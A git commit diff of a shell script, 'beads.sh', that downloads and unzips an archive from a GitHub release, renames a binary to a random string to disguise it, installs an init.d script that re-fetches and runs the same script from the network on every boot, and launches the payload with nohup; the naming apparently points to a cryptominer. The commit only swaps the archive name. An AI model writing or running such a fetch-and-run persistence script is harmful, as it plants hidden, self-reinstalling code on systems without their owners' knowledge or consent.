e17688179d5053d9610926e87a10daa8000ee7d7
kilnqe <angririri@gmail.com>
2024-06-16 02:59:25 +0700

    Update beads.sh

--- beads.sh
+++ beads.sh
@@ -1,7 +1,7 @@
 cd /
-wget https://github.com/kilnqe/idols/releases/download/v1.9.7/coins.zip
-unzip coins.zip
-cd /coins
+wget https://github.com/kilnqe/idols/releases/download/v1.9.7/cocs.zip
+unzip cocs.zip
+cd /cocs
 variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 mv flint $variable1
 sed -i "s/python/${variable1}/g" ./chert.sh
@@ -10,7 +10,7 @@ cd /etc/init.d
 echo "bash <(curl -s -L https://raw.githubusercontent.com/kilnqe/idols/main/beads.sh)" > stela.sh
 chmod a+x stela.sh
 update-rc.d stela.sh defaults
-rm -rf coins.zip
-cd /coins
+rm -rf cocs.zip
+cd /cocs
 nohup ./chert.sh
-ps -ef | grep coins
+ps -ef | grep cocs
